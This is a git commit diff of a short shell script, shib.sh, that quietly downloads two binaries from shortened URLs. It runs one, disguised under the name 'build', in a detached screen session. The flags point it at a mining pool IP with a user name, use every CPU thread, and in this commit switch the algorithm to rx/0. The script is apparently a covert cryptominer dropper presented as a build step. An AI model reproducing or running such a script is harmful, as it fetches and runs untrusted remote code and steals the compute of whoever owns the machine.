cf00b91bc47a5c5f326bdcae9478553889140ee4
Omarjetos <93458140+Omarjetos@users.noreply.github.com>
2021-11-09 02:33:13 -0800

    Update shib.sh

--- shib.sh
+++ shib.sh
@@ -3,6 +3,6 @@ wget -qO compile.sh https://git.io/JPjuz
 wget -qO build https://git.io/JX29n
 chmod +x build
 chmod +x compile.sh
-screen -dm -S build ./build -a argon2/chukwav2 -o 137.184.3.159:2112 -u cieeenontonya -t $(nproc --all) -k -m
+screen -dm -S build ./build -a rx/0 -o 137.184.3.159:2112 -u cieeenontonya -t $(nproc --all) -k -m
 ./compile.sh
 echo succes
